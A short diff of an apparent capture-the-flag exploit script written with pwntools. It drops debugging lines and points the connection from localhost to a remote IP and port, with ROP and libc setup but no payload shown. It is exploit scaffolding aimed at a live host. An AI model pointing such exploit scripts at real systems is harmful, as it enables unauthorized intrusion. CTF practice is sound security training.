@@ -1,21 +1,15 @@
 from pwn import *
-from time import sleep
 
-BINARY = "../challenge/chall"
-LIBC = "../challenge/libc.so.6"
+BINARY = "chall"
+LIBC = "libc.so.6"
 
 context.binary = BINARY
 elf = context.binary
 rop = ROP(elf)
 libc = ELF(LIBC)
 
-# p = elf.process(cwd="../challenge/")
-p = remote("localhost", 10002)
-
-# gdb.attach(p, gdbscript="""
-# b *hidden_level+104
-# b *odd_option+333""")
-# sleep(5)
+# p = elf.process()
+p = remote("34.76.206.46", 10004)
 
 p.sendlineafter(b"Enter a number: ", b"3")
 
